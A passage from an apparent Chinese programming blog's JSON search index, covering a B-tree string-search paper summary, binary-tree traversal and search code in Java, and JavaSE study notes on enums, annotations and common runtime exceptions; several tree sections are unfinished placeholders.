for string similarity search based on edit distance》**\n\n- 作者：Zhenjie Zhang, Marios Hadjieleftheriou, Beng Chin Ooi, Divesh Srivastava\n- 单位：新加坡国立大学、AT&T Labs\n- 会议：[SIGMOD '10](https://dl.acm.org/doi/abs/10.1145/1807167.1807266)【CCF A】\n\n- 时间：2010年06月\n\n本文中提出 **B<sup>ed</sup>-tree**，一种**基于 B-tree** 的索引结构，用于**评估编辑距离**和标准化编辑距离的**相似度查询**。我们确定从字符串空间到整数空间的映射的必要属性，以支持搜索和修剪这些查询。提出了三种转换用于捕获字符串中固有信息的不同方面，从而在树上的搜索过程中实现高效的剪枝。与最先进的字符串相似性搜索方法相比， B<sup>ed</sup>-tree 是一个完整的解决方案，满足所有应用程序的要求，提供高可扩展性和快速响应时间。\n\n## 参考\n\n- [B树 - 数据结构教程™ (yiibai.com)](https://www.yiibai.com/data_structure/b-tree.html)\n\n- [漫画：什么是B-树？ - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/54084335)\n\n- [终于有篇看的懂的B树文章了！](https://mp.weixin.qq.com/s/MolVZjVAIXRj48_SreN4MA)\n\n- [换一个角度看 B+ 树](https://mp.weixin.qq.com/s/A5gNVXMNE-iIlY3oofXtLw)\n\n- [索引为什么能提高查询性能](https://mp.weixin.qq.com/s?__biz=MzUxODAzNDg4NQ==&mid=2247486903&idx=1&sn=1c6ca6817baa255265fc25dd69551179&scene=21#wechat_redirect)\n\n- [MYSQL索引数据结构为什么使用B+树？](https://www.cnblogs.com/SweetCode/p/15233526.html)\n\n- [数据结构之B树查找、插入、删除详解](https://weishihuai.blog.csdn.net/article/details/109389544)\n\n- [ 数据结构之B+树插入详解](https://blog.csdn.net/Weixiaohuai/article/details/109493541)\n\n- [(9条消息) 从B树、B+树、B*树谈到R 树](https://blog.csdn.net/v_JULY_v/article/details/6530142/)\n\n  \n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["数据结构"],"categories":["结构-算法"]},{"title":"数据结构：二叉树","url":"/posts/19968.html","content":"\n## 树的诞生\n\n1、**数组存储方式的分析**\n\n- 数组未排序 \n\n  - 优点：在数组尾添加元素，速度快\n\n  - 缺点：查找速度慢\n\n- 数组排序\n  - 优点：可以使用二分查找，查找速度快\n  - 缺点：为了保证数组有序，在添加新数据时，找到插入位置后，后面的数据需整体移动，速度慢。\n\n2、**链式存储方式的分析**\n\n- 优点：在一定程度上对数组存储方式有优化，增加和删除元素速度快\n- 缺点：不管链表是否有序，查找速度都慢(检索某个值，需要从头节点开始遍历) \n\n3、**树存储方式的分析**\n\n能提高数据存储，读取的效率。比如利用二叉排序树，既可以保证数据的检索速度，同时也可以保证数据的插入，删除，修改的速度。\n\n## 树中的术语\n\n- 结点：指树中的一个元素，一般用 n 表示\n\n- 结点的度：指结点拥有的子结点的个数，二叉树的度不大于2\n\n- 树的度：指树中各结点的度的最大值\n- 树的阶：指树中的一个结点最多能有多少个子节点，一般用字母 M 表示阶数\n- 分支结点：度大于0的结点，除了叶子结点之外的结点\n\n- 叶结点：度为 0 的结点，也称为终端结点\n\n- 高度：从下到上\n  - 指从叶子节点到该节点的最长简单路径边的条数或者节点数\n\n  - 叶子节点的高度为1，根节点高度最高\n\n- 深度：从上到下\n  - 指从根节点到该节点的最长简单路径边的条数或者节点数\n\n  - **根节点的高度就是二叉树的最大深度**\n\n- 层：规定根节点在1层，其他任意节点是其父节点的层数+1\n- 森林：彼此不相交的树的集合\n\n\n\n## 二叉树\n\n### 简介\n\n- 二叉树：每个结点最多只能有两个子结点(左结点和右结点)\n- 满二叉树：二叉树的所有叶子结点都在最后一层，且结点总数为 2<sup>n</sup> -1 , n 为层数\n- 完全二叉树：二叉树的所有叶子结点都在最后一层或者倒数第二层，而且最后一层的叶子结点在左边连续，倒数第二层的叶子结点在右边连续\n- 左斜树：所有节点都只有左子树的二叉树\n- 右斜树：所有节点都只有右子树的二叉树\n\n### 前序遍历\n\n> 先输出父节点，再遍历左子树和右子树\n\n#### 递归\n\n```java\npublic void preOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tSystem.out.print(root.data + \" -> \");\n\t\tpreOrderRecur(root.left);\n\t\tpreOrderRecur(root.right);\n\t}\n```\n\n#### 非递归\n\n```java\npublic void preOrder() {\n\t\tif (root == null)\n\t\t\treturn;\n\t\tNode current;\n\t\t//把LinkedList当栈使用\n\t\tLinkedList<Node> s = new LinkedList<Node>();\n\t\ts.addFirst(root);\n\t\twhile (!s.isEmpty()) {\n\t\t\tcurrent = s.removeFirst();\n\t\t\tSystem.out.print(current.data + \" -> \");\n\t\t\tif (current.right != null)\n\t\t\t\ts.addFirst(current.right);\n\t\t\tif (current.left != null)\n\t\t\t\ts.addFirst(current.left);\n\t\t}\n\n\t}\n```\n\n### 中序遍历\n\n> 先遍历左子树，**再输出父节点**，再遍历右子树\n\n#### 递归\n\n```java\npublic void inOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tinOrderRecur(root.left);\n\t\tSystem.out.print(root.data + \" -> \");\n\t\tinOrderRecur(root.right);\n\t}\n\n```\n\n#### 非递归\n\n```java\npublic void inOrder() {\n\t\tNode current = root;\n\t\t//把LinkedList作为栈使用\n\t\tLinkedList<Node> s = new LinkedList<Node>();\n\t\twhile (current != null || !s.isEmpty()) {\n\t\t\twhile (current != null) {\n\t\t\t\ts.addFirst(current);\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t\tif (!s.isEmpty()) {\n\t\t\t\tcurrent = s.removeFirst();\n\t\t\t\tSystem.out.print(current.data + \" -> \");\n\t\t\t\tcurrent = current.right;\n\t\t\t}\n\t\t}\n\t}\n```\n\n参考：[二叉树中序遍历（递归+非递归）](https://blog.csdn.net/dabusiGin/article/details/102723054)\n\n### 后序遍历\n\n> 先遍历左子树，再遍历右子树，**最后输出父节点**\n\n#### 递归\n\n```java\npublic void postOrderRecur(Node root) {\n\t\tif (root == null) {\n\t\t\treturn;\n\t\t}\n\t\tpostOrderRecur(root.left);\n\t\tpostOrderRecur(root.right);\n\t\tSystem.out.print(root.data + \" -> \");\n\t}\n```\n\n#### 非递归\n\n```java\npublic void postOrder() {\n\t\tNode current = root;\n\t\tLinkedList<Node> s1 = new LinkedList<Node>();\n\t\tLinkedList<Node> s2 = new LinkedList<Node>();\n\t\twhile (current != null || !s1.isEmpty()) {\n\t\t\twhile (current != null) {\n\t\t\t\ts1.addFirst(current);\n\t\t\t\ts2.addFirst(current);\n\t\t\t\tcurrent = current.right;\n\t\t\t}\n\t\t\tif (!s1.isEmpty()) {\n\t\t\t\tcurrent = s1.removeFirst();\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t}\n\t\twhile (!s2.isEmpty()) {\n\t\t\tSystem.out.print(s2.removeFirst().data + \" -> \");\n\t\t}\n\t}\n```\n\n### 层次遍历\n\n```java\nvoid bfs(TreeNode root) {\n    Queue<TreeNode> queue = new ArrayDeque<>();\n    queue.add(root);\n    while (!queue.isEmpty()) {\n        TreeNode node = queue.poll();\n        if (node.left != null) {\n            queue.add(node.left);\n        }\n        if (node.right != null) {\n            queue.add(node.right);\n        }\n    }\n}\n```\n\n\n\n### 查找\n\n```java\npublic boolean contains(int e) {\n\t\t//用current记录根节点\n\t\tNode current = root;\n\t\twhile (current != null) {\n\t\t\t//相等，说明找到了，返回true\n\t\t\tif (e == current.data) {\n\t\t\t\treturn true;\n\t\t\t\t//要查找的数比根节点大，指向根节点的右儿子\n\t\t\t} else if (e > current.data) {\n\t\t\t\tcurrent = current.right;\n\t\t\t\t//要查找的数比根节点下，指向根节点的左儿子\n\t\t\t} else {\n\t\t\t\tcurrent = current.left;\n\t\t\t}\n\t\t}\n\t\t//找不到，返回false\n\t\treturn false;\n\t}\n```\n\n\n\n### 删除\n\n**代码实现**\n\n```\n\n```\n\n## 顺序存储二叉树\n\n。。。\n\n## 线索化二叉树\n\n。。。\n\n## 二叉搜索树-BST\n\n二叉搜索树(BST: Binary Search Tree)：任何一个非叶子结点，要求左子结点的值比当前结点的值小，右子结点的值比当前结点的值大。\n\n### 创建和遍历\n\n。。。\n\n### 删除\n\n。。。\n\n### 复杂度\n\n- 时间复杂度：O(log<sub>2</sub>n)～O(n)\n\n  - 如果二叉搜索树是平衡的，则 n 个节点的二叉排序树的高度为 log<sub>2</sub>n+1 ，其查找效率为O(log<sub>2</sub>n)，近似于折半查找。\n\n  - 如果二叉搜索树完全不平衡，则其深度可达到 n，查找效率为 O(n)，退化为顺序查找。\n\n- 空间复杂度：O(n)\n\n## 平衡二叉树-AVL\n\n### 引出\n\n给你一个序列 {1,2,3,4,5,6}，要求创建一颗二叉搜索树(BST)\n\n<img src=\"https://img.jwt1399.top/img/image-20220411191625032.png\" style=\"zoom:50%;\" />\n\n可以看到左子树全部为空，极端情况下，二叉树会退化成链表\n\n- 插入速度没有影响\n- 查询速度明显降低(需要依次比较)，搜索效率降低为 O(n)\n\n由此，二叉搜索树的查找效率取决于树的高度，因此保持树的高度最小，即可保证树的查找效率。如何保证？这就要引入平衡二叉树了！\n\n### 简介\n\n平衡二叉树，由前苏联的数学家 **A**delse-**V**elskil 和 **L**andis 在 1962 年提出的高度平衡的二叉树，根据科学家的英文名也称为 **AVL 树**。 可以保证查询效率较高。\n\n**特点：**\n\n- 必须是二叉搜索树\n- 每个结点的左子树和右子树的高度差的绝对值不超过1\n\n**平衡因子**：将二叉树上节点的左子树高度减去右子树高度的值称为该节点的平衡因子BF(Balance Factor)。\n\n### 左旋转\n\n![](/Users/jianjian/jwt1399.github.io/source/images/数据结构-树/v2-0a737f5850ac96deec1821c80391a08a_b.jpg)\n\n### 右旋转\n\n![](/Users/jianjian/jwt1399.github.io/source/images/数据结构-树/v2-eee97a3e3e45d8cb6668841f6b44191a_b.jpg)\n\n### 双旋转\n\n。。。\n\n## 红黑树\n\n红黑树是 AVL 树的变体\n\n- 结点不是红色就是黑色，根结点必是黑色\n- 叶子结点是 null 结点（空结点）且为黑色\n\n- 每个红色结点的两个子结点都是黑色。（同一路径，不存在连续的红色节点）\n- 每个节点到叶子节点的所有路径，都包含相同数目的黑色节点（相同的黑色高度）\n\n## B-树家族\n\n请参考小简的另一篇文章：[B-Tree家族 | 简简 (jwt1399.top)](https://jwt1399.top/posts/30130.html)\n\n## 字典树\n\n。。。\n\n## 参考\n\n- [Data Structure Visualization (usfca.edu)](https://www.cs.usfca.edu/~galles/visualization/Algorithms.html)\n- [数据结构图文解析之：树的简介及二叉排序树C++模板实现](https://cloud.tencent.com/developer/article/1155142)\n- [数据结构图文解析之：AVL树详解及C++模板实现](https://cloud.tencent.com/developer/article/1155143)\n\n## ❤️Sponsor\n\n您的支持是我不断前进的动力，如果您恰巧财力雄厚，又感觉本文对您有所帮助的话，可以考虑打赏一下本文，用以维持本博客的运营费用，拒绝白嫖，从你我做起！🥰🥰🥰\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">支付宝支付</td>\n         <td style=\"text-align:center;\">微信支付</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["数据结构"],"categories":["结构-算法"]},{"title":"JavaSE-汇总","url":"/posts/9855.html","content":"\n## 前言\n\nJavaSE 完结，撒花🌸🌸🌸，Java-基础的学习就将告一段落，今天我将之前发布的《Java-XXX》系列学习笔记进行汇总一下，此系列是我做的一个 “Java 从 0 到 1” 实验，给自己一年左右时间，按照我自己总结的 [Java-学习路线](https://jwt1399.top/posts/29829.html)，从 0 开始学 Java 知识，并不定期更新所学笔记，期待一年后的蜕变吧！<有同样想法的小伙伴，可以联系我一起交流学习哦！>\n\n## 笔记汇总\n\n- 环境配置：见本文下方\n- IDEA 插件：见本文下方\n- 面向对象：[Java-面向对象 | 简简](https://jwt1399.top/posts/64598.html)\n- 枚举：[Java-枚举 | 简简](https://jwt1399.top/posts/9855.html#toc-heading-7)\n- 注解：[Java-注解 | 简简](https://jwt1399.top/posts/9855.html#toc-heading-15)\n- 常用类：[Java-常用类 | 简简](https://jwt1399.top/posts/33453.html)\n- 集合：[Java-集合 | 简简](https://jwt1399.top/posts/6773.html)\n- 异常：[Java-异常 | 简简](https://jwt1399.top/posts/9855.html#toc-heading-16)\n- 泛型：[Java-泛型 | 简简](https://jwt1399.top/posts/9855.html#toc-heading-28)\n- 线程：[Java-线程 | 简简](https://jwt1399.top/posts/18034.html)\n- IO流：[Java-IO流 | 简简](https://jwt1399.top/posts/52970.html)\n- 网络编程：[Java-网络编程 | 简简](https://jwt1399.top/posts/43348.html)\n- JDBC：[Java-JDBC | 简简](https://jwt1399.top/posts/146.html)\n\n- Java8 新特性：[Java 8 新特性 | 简简](https://jwt1399.top/posts/58320.html)\n- 反射：[Java-反射 | 简简](https://jwt1399.top/posts/13406.html)\n- 正则：[Java-正则 | 简简](https://jwt1399.top/posts/9855.html#toc-heading-42)\n\n##   环境配置\n\n### Mac M1 JDK安装\n\nJDK 推荐使用 Zulu JDK，因为适配了 ARM 架构,下载 [Download Azul Zulu Builds of OpenJDK](https://www.azul.com/downloads/?version=java-8-lts&os=macos&architecture=arm-64-bit&package=jdk)\n\n根据需求选择 .dmg 格式的 JDK 下载就可以了，下载后点击安装，按照步骤进行，完成后，在控制台输入`java -version` 查看是否安装成功\n\n```bash\n$ java -version\nopenjdk version \"1.8.0_312\"\nOpenJDK Runtime Environment (Zulu 8.58.0.13-CA-macos-aarch64) (build 1.8.0_312-b07)\nOpenJDK 64-Bit Server VM (Zulu 8.58.0.13-CA-macos-aarch64) (build 25.312-b07, mixed mode)\n```\n\n`Zulu JDK`默认安装在`/Library/Java/JavaVirtualMachines`目录下\n\n```bash\n/usr/libexec/java_home -V #查看安装Java路径\n```\n\n## IDEA插件\n\n1. **Translation** 翻译，可以翻译英文注释\n2. **Alibaba Java Coding Guidelines** 阿里巴巴编码规范检查工具(option+enter)\n3. **SequenceDiagram**  一个时序图插件，右键方法名能看到方法里整个的调用流程\n4. **Rainbow Brackets** 花括号和大括号颜色配对显示\n5. **RestfulToolkit** 可以通过 url 定位到 controller 和通过接口生成完整 url\n6. **Randomness** 可以在代码里生成随机数用来测试\n7. **MyBatisX** 添加从 mapper 跳转到对应 xml 的功能\n8. **CamelCase** 变量下划线转驼峰命名\n\n8. **.ignore** 可以生成 ignore 文件比如 .gitignore\n9. **Key Promoter X** 快捷键提示 鼠标操作后右下角会提示有什么快捷键能快速完成刚刚鼠标的操作\n\n## 枚举\n\n###  引入枚举\n\n首先创建一个季节(Season) 对象\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration01 {\n    public static void main(String[] args) {\n        //使用\n        Season spring = new Season(\"春天\", \"温暖\");\n        Season winter = new Season(\"冬天\", \"寒冷\");\n        Season summer = new Season(\"夏天\", \"炎热\");\n        Season autumn = new Season(\"秋天\", \"凉爽\");\n        autumn.setName(\"XXX\");//可以修改秋天的名字\n        autumn.setDesc(\"非常的热..\");//可以修改秋天的描述\n        Season other = new Season(\"红天\", \"~~~\");//可以增加其他季节\n        System.out.println(autumn);\n    }\n}\n\nclass Season {\n    private String name;\n    private String desc;//描述\n\n    public Season(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public void setName(String name) {\n        this.name = name;\n    }\n\n    public String getDesc() {\n        return desc;\n    }\n\n    public void setDesc(String desc) {\n        this.desc = desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n\n}\n\n```\n\nSeason 对象要有如下特点\n\n- 1.季节的值是有限的几个值(spring, summer, autumn, winter)\n\n- 2.季节只读，不需要修改。\n\n上面代码的方法不满足上面的两个特点，要如何实现呢？答：使用枚举\n\n### 枚举实现\n\n> 枚举有二种实现方式：1.自定义类实现、2.使用 enum 关键字实现\n\n1) 枚举对应英文(enumeration, 简写enum)\n\n2) 枚举是一组常量的集合。\n\n3) 可以这里理解：枚举属于一种特殊的类，里面只包含一组有限的特定的对象。\n\n#### 自定义类实现枚举\n\n- 1.不需要提供setXxx方法，因为枚举对象值通常为只读，\n- 2.对枚举对象/属性使用 final + static 共同修饰，实现底层优化。\n- 3.枚举对象名通常使用全部大写，常量的命名规范\n- 4.枚举对象根据需要，也可以有多个属性\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration02 {\n    public static void main(String[] args) {\n        System.out.println(Season.AUTUMN);\n        System.out.println(Season2.SUMMER);\n    }\n}\n\nclass Season {\n    private String name;\n    private String desc;//描述\n\n    //定义了四个对象, 固定.\n    public static final Season SPRING = new Season(\"春天\", \"温暖\");\n    public static final Season WINTER = new Season(\"冬天\", \"寒冷\");\n    public static final Season AUTUMN = new Season(\"秋天\", \"凉爽\");\n    public static final Season SUMMER = new Season(\"夏天\", \"炎热\");\n\n\n    //1. 将构造器私有化,目的防止直接new\n    //2. 去掉setXxx 方法, 防止属性被修改\n    //3. 在Season 内部，直接创建固定的对象\n    //4. 优化，可以加入final 修饰符\n    private Season(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n    \n    public String getDesc() {\n        return desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n\n}\n\n```\n\n#### enum 关键字实现枚举\n\n- 1.使用关键字 enum 替代 class\n- 2.定义常量对象方式：常量名(实参列表)   eg：SPRING(\"春天\", \"温暖\")\n- 3.如果有多个常量(对象)， 使用 \",\" 号间隔，最后有一个分号结尾\n- 4.如果使用 enum 来实现枚举，要求将定义常量对象写在最前面\n- 5.如果我们使用的是无参构造器，创建常量对象，则可以省略()\n\n```java\npackage com.jwt.enum_;\n\npublic class Enumeration03 {\n    public static void main(String[] args) {\n        System.out.println(Season2.AUTUMN);\n        System.out.println(Season2.SUMMER);\n    }\n}\n\nenum Season2 {\n  \n    SPRING(\"春天\", \"温暖\"), WINTER(\"冬天\", \"寒冷\"), AUTUMN(\"秋天\", \"凉爽\"),\n    SUMMER(\"夏天\", \"炎热\")/*, What()*/;\n    private String name;\n    private String desc;//描述\n\n    private Season2() {//无参构造器\n    }\n\n    private Season2(String name, String desc) {\n        this.name = name;\n        this.desc = desc;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    public String getDesc() {\n        return desc;\n    }\n\n    @Override\n    public String toString() {\n        return \"Season{\" +\n                \"name='\" + name + '\\'' +\n                \", desc='\" + desc + '\\'' +\n                '}';\n    }\n}\n```\n\n注意事项\n\n1.当我们使用 enum 关键字开发一个枚举类时，默认会继承 Enum 类, 而且是一个 final 类，使用javap 工具可以看到\n\n2.传统的public static final Season2 SPRING = new Season2(\"春天\", \"温暖\"); 简化成SPRING(\"春天\", \"温暖\")， 这里必须知道，它调用的是哪个构造器\n\n3.如果使用无参构造器创建枚举对象，则实参列表和小括号都可以省略\n\n4.当有多个枚举对象时，使用 \",\" 间隔，最后有一个分号结尾\n\n5.枚举对象必须放在枚举类的行首\n\nJavap 反编译上面生成的 class，可以分析出跟自定义实现方法差不多\n\n```bash\n$ javac Enumeration03.java\n$ javap Season2.class\nCompiled from \"Enumeration03.java\"\nfinal class com.jwt.enum_.Season2 extends java.lang.Enum<com.jwt.enum_.Season2> {\n  public static final com.jwt.enum_.Season2 SPRING;\n  public static final com.jwt.enum_.Season2 WINTER;\n  public static final com.jwt.enum_.Season2 AUTUMN;\n  public static final com.jwt.enum_.Season2 SUMMER;\n  public static com.jwt.enum_.Season2[] values();\n  public static com.jwt.enum_.Season2 valueOf(java.lang.String);\n  public java.lang.String getName();\n  public java.lang.String getDesc();\n  public java.lang.String toString();\n  static {};\n}\n```\n\n#### enum 常用方法\n\n使用关键字enum 时，会隐式继承Enum 类, 这样我们就可以使用Enum 类相关的方法。\n\n- toString：Enum 类已经重写过了，返回的是当前对象名,子类可以重写该方法，用于返回对象的属性信息\n\n- name：返回当前对象名（常量名），子类中不能重写\n\n- ordinal：返回当前对象的编号(定义时的位置)，默认从 0 开始\n\n- values：返回当前枚举类中所有的常量\n\n- valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常！\n\n- compareTo：比较两个枚举常量，比较的就是编号\n\n```java\npackage com.jwt.enum_;\n\npublic class EnumMethod {\n    public static void main(String[] args) {\n        //使用Season2 枚举类，来演示各种方法\n        Season2 autumn = Season2.AUTUMN;\n        //输出枚举对象的名字\n        System.out.println(autumn.name());\n        //ordinal() 输出的是该枚举对象的次序/编号，从0 开始编号\n        //AUTUMN 枚举对象是第三个，因此输出2\n        System.out.println(autumn.ordinal());\n        //从反编译可以看出values 方法，返回Season2[]\n        //含有定义的所有枚举对象\n        Season2[] values = Season2.values();\n        System.out.println(\"===遍历取出枚举对象(增强for)====\");\n        for (Season2 season : values) {//增强for 循环\n            System.out.println(season);\n        }\n        //valueOf：将字符串转换成枚举对象，要求字符串必须为已有的常量名，否则报异常\n        //1. 根据你输入的\"AUTUMN\" 到Season2 的枚举对象去查找\n        //2. 如果找到了，就返回，如果没有找到，就报错\n        Season2 autumn1 = Season2.valueOf(\"AUTUMN\");\n        System.out.println(\"autumn1=\" + autumn1);\n        //compareTo：比较两个枚举常量，比较的就是编号\n        //1. 就是把Season2.AUTUMN 枚举对象的编号和Season2.SUMMER 枚举对象的编号比较\n        /*源码\n        public final int compareTo(E o) {\n            return self.ordinal - other.ordinal;\n        }\n        */\n        //Season2.AUTUMN 的编号[2] - Season2.SUMMER 的编号[3]\n        System.out.println(Season2.AUTUMN.compareTo(Season2.SUMMER));\n    }\n}\n```\n\n### 实例练习🌰\n\n- 声明 Week 枚举类，其中包含星期一至星期日的定义\n\n- MONDAY, TUESDAY, WEDNESDAY, THURSDAY, FRIDAY,SATURDAY, SUNDAY;\n\n- 使用 values 返回所有的枚举数组, 并遍历\n\n```java\npackage com.jwt.enum_;\n\npublic class EnumExercise02 {\n    public static void main(String[] args) {\n        //获取到所有的枚举对象， 即数组\n        Week[] weeks = Week.values();\n        //遍历，使用增强for\n        for (Week w:weeks) {\n            System.out.println(w);\n        }\n    }\n\n}\n\nenum Week{\n    MONDAY(\"星期一\"),TUESDAY(\"星期二\"), WEDNESDAY(\"星期三\"),\n    THURSDAY(\"星期四\"), FRIDAY(\"星期五\"),SATURDAY(\"星期六\"), SUNDAY(\"星期天\");\n    private String name;\n\n    Week(String name) {\n        this.name = name;\n    }\n\n    public String getName() {\n        return name;\n    }\n\n    @Override\n    public String toString() {\n        return \"Week{\" +\n                \"name='\" + name + '\\'' +\n                '}';\n    }\n}\n```\n\n### enum 实现接口\n\n- 使用 enum 关键字后，就不能再继承其它类了，因为 enum 会隐式继承 Enum，而Java 是单继承机制。\n\n- 枚举类和普通类一样，可以实现接口 \n\n- ```java\n  enum 类名 implements 接口1，接口2{}\n  ```\n\n\n```java\npackage com.jwt.enum_;\n\n/**\n * @author：简简\n * @createTime：[2022/3/13 13:20]\n **/\npublic class EnumDetail {\n    public static void main(String[] args) {\n        Music.CLASSICMUSIC.playing();\n    }\n}\n\nclass A {\n}\n\ninterface Playing {\n    public void playing();\n}\n\nenum Music implements Playing {\n    CLASSICMUSIC;//无参构造器，创建常量对象，则可以省略()\n\n    @Override\n    public void playing() {\n        System.out.println(\"播放好听的音乐...\");\n    }\n}\n```\n\n\n\n## 注解\n\n- 注解(Annotation)也被称为元数据(Metadata)，用于修饰解释包、类、方法、属性、构造器、局部变量等数据信息。\n\n- 和注释一样，注解不影响程序逻辑，但注解可以被编译或运行，相当于嵌入在代码中的补充信息。\n\n- 在JavaSE 中，注解的使用目的比较简单，例如标记过时的功能，忽略警告等。在JavaEE 中注解占据了更重要的角色，例如用来配置应用程序的任何切面，代替 JavaEE 旧版中所遗留的繁冗代码和 XML 配置等。\n\n- 使用 Annotation 时要在其前面增加 @ 符号, 并把该 Annotation 当成一个修饰符使用。用于修饰它支持的程序元素\n\n**三个基本的 Annotation**\n\n1) @Override: 限定某个方法，是重写父类方法, 该注解只能用于方法\n\n2) @Deprecated: 用于表示某个程序元素(类, 方法等)已过时，该注解可以修饰方法，类，字段, 包, 参数等等\n\n3) @SuppressWarnings(\"all\"): 抑制编译器警告\n\n   - 可以指定的警告类型有\n\n     ```\n     all，抑制所有警告\n     boxing，抑制与封装/拆装作业相关的警告\n     cast，抑制与强制转型作业相关的警告\n     dep-ann，抑制与淘汰注释相关的警告\n     deprecation，抑制与淘汰的相关警告\n     fallthrough，抑制与switch 陈述式中遗漏break 相关的警告\n     finally，抑制与未传回finally 区块相关的警告\n     hiding，抑制与隐藏变数的区域变数相关的警告\n     incomplete-switch，抑制与switch 陈述式(enum case)中遗漏项目相关的警告\n     javadoc，抑制与javadoc 相关的警告第497页\n     nls，抑制与非nls 字串文字相关的警告\n     null，抑制与空值分析相关的警告\n     rawtypes，抑制与使用raw 类型相关的警告\n     resource，抑制与使用Closeable 类型的资源相关的警告\n     restriction，抑制与使用不建议或禁止参照相关的警告\n     serial，抑制与可序列化的类别遗漏serialVersionUID 栏位相关的警告\n     static-access，抑制与静态存取不正确相关的警告\n     static-method，抑制与可能宣告为static 的方法相关的警告\n     super，抑制与置换方法相关但不含super 呼叫的警告\n     synthetic-access，抑制与内部类别的存取未最佳化相关的警告\n     sync-override，抑制因为置换同步方法而遗漏同步化的警告\n     unchecked，抑制与未检查的作业相关的警告\n     unqualified-field-access，抑制与栏位存取不合格相关的警告\n     unused，抑制与未用的程式码及停用的程式码相关的警告\n     ```\n\n**元注解的基本介绍**\n\n- JDK 的元 Annotation 用于修饰其他 Annotation\n\n- 元注解的种类\n  - Retention //指定注解的作用范围，三种SOURCE,CLASS,RUNTIME\n    -  RetentionPolicy.SOURCE: 编译器使用后，直接丢弃这种策略的注释\n    - RetentionPolicy.CLASS: 编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 不会保留注解。这是默认值\n    - RetentionPolicy.RUNTIME:编译器将把注解记录在 class 文件中，当运行 Java 程序时, JVM 会保留注解. 程序可以通过反射获取该注解\n  - Target // 指定注解可以在哪些地方使用\n  - Documented //指定该注解是否会在javadoc 体现\n  - Inherited //子类会继承父类注解\n\n## 异常\n\n### 基本概念\n\nJava语言中，将程序执行中发生的不正常情况称为\"异常”。(开发过程中的语法错误和逻辑错误不是异常)\n\n执行过程中所发生的异常事件可分为两大类\n\n1) Error(错误):\n- Java虚拟机无法解决的严重问题。 如: JVM系统内部错误、 资源耗尽等严重情况。比如: StackOverflowError[栈溢出]和OOM(out of memory), Error 是严重错误，程序会崩溃。\n2. Exception:\n\n- 其它因编程错误或偶然的外在因素导致的一般性问题，可以使用针对性的代码进行处理。例如空指针访问，试图读取不存在的文件，网络连接中断等等，\n- Exception 分为两大类:\n  - 运行时异常[程序运行时，发生的异常]\n    - 运行时异常，编译器检查不出来。一般是指编程时的逻辑错误，是程序员应该避免其出现的异常。java.lang.RuntimeException类及它的子类都是运行时异常\n    - 对于运行时异常，可以不作处理，因为这类异常很普遍，若全处理可能会对程\n      序的可读性和运行效率产生影响\n  - 编译时异常[编程时，编译器检查出的异常]\n    - 编译时异常，是编译器要求必须处置的异常。\n\n![](https://img.jwt1399.top/img/image-20220224105046212.png)\n\n### 常见运行时异常\n\n- NullPointerException 空指针异常\n- ArithmeticException 数学运算异常\n-  ArrayIndexOutOfBoundsException 数组下标越界异常\n- ClassCastException 类型转换异常\n-  NumberFormatException 数字格式不正确异常\n\n#### NullPointerException\n\n当应用程序试图在需要对象的地方使用null 时，抛出该异常\n\n```java\npublic class NullPointerException_ {\n    public static void main(String[] args) {\n        String name = null;\n        System.out.println(name.length());\n    }\n}\n```\n\n#### ArithmeticException\n\n当出现异常的运算条件时，抛出此异常。\n\n```java\npublic class ArithmeticException_ {\n    public static void main(String[] args) {\n        int num1 = 10;\n        int num2 = 0;\n        int res = num1 / num2;\n    }\n}\n```\n\n####  ArrayIndexOutOfBoundsException\n\n用非法索引访问数组时抛出的异常。如果索引为负或大于等于数组大小，则该索引为非法索引\n\n```java\npublic class ArrayIndexOutOfBoundsException_ {\n    public static void main(String[] args) {\n        int[] arr = {1, 2, 4};\n        for (int i = 0; i <= arr.length; i++) {\n            System.out.println(arr[i]);\n        }\n    }\n}\n```\n\n#### ClassCastException\n\n当试图将对象强制转换为不是实例的子类时，抛出该异常\n\n```java\npublic class ClassCastException_ {\n    public static void main(String[] args) {\n        A b = new B(); //向上转型\n        B b2 = (B)b;//向下转型，这里是OK\n        C c2 = (C)b;//这里抛出ClassCastException\n    }\n}\nclass A {}\nclass B extends A {}\nclass C extends A {}\n```\n\n####  NumberFormatException\n\n当应用程序试图将字符串转换成一种数值类型，但该字符串不能转换为适当格式时，抛出该异常\n\n```java\npublic class NumberFormatException_ {\n    public static void main(String[] args) {\n        String name = \"教育\";\n        